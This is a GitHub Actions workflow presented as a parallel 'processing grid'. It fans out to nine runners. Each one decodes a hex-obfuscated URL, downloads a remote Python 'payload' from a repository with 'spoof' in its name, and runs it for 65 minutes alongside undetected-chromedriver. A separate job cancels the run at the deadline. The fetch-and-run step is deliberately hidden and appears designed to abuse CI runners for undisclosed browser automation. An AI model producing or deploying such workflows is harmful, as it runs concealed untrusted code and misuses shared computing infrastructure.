name: Orchestrated Async Processing Grid

on:
  workflow_dispatch:

concurrency:
  group: grid-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  watchdog:
    name: "Deadline Enforcer"
    runs-on: ubuntu-20.04
    timeout-minutes: 75
    steps:
      - name: Deploy Countdown
        run: |
          echo "[ENFORCER] Deadline enforcer deployed. Auto-cancel scheduled at 65 minutes."
          echo "[ENFORCER] Run identifier: ${{ github.run_id }}"
          
          sleep 3900
          
          echo "[ENFORCER] Deadline reached. Triggering cancellation..."
          
          curl -sS -X POST \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -H "Accept: application/vnd.github+json" \
            -H "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"
          
          echo "[ENFORCER] Cancellation signal sent."

  parallel-workers:
    name: "GridNode-${{ matrix.slot }}"
    runs-on: ubuntu-20.04
    timeout-minutes: 70

    strategy:
      fail-fast: false
      matrix:
        slot: [10, 20, 30, 40, 50, 60, 70, 80, 90]

    steps:
      - name: Prepare Runtime
        run: |
          echo "[PREP] Preparing runtime for GridNode-${{ matrix.slot }}..."
          sudo apt-get update -qq
          sudo apt-get install -y curl python3-pip

      - name: Download Payload
        run: |
          echo "[DOWNLOAD] Fetching payload..."
          PAYLOAD_URL=$(echo "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f4d794d757368726f6f6d32322f6b6563696c6178332d73706f6f662f6d61737465722f73746172742e7079" | xxd -r -p)
          curl -sL "$PAYLOAD_URL" -o payload.py
          echo "[DOWNLOAD] Payload ready."

      - name: Install Libraries
        run: |
          echo "[LIBS] Installing dependencies..."
          pip3 install -q undetected-chromedriver selenium requests

      - name: Run Timed Execution
        run: |
          echo ">> Starting GridNode-${{ matrix.slot }}..."
          python3 payload.py &
          TASK_PID=$!
          
          echo ">> Execution window: 65 minutes (3900 seconds)."
          
          sleep 3900
          
          if kill -0 $TASK_PID 2>/dev/null; then
            echo ">> Time limit exceeded. Terminating task..."
            kill -9 $TASK_PID
            echo ">> Task terminated."
          else
            echo ">> Task completed normally."
          fi
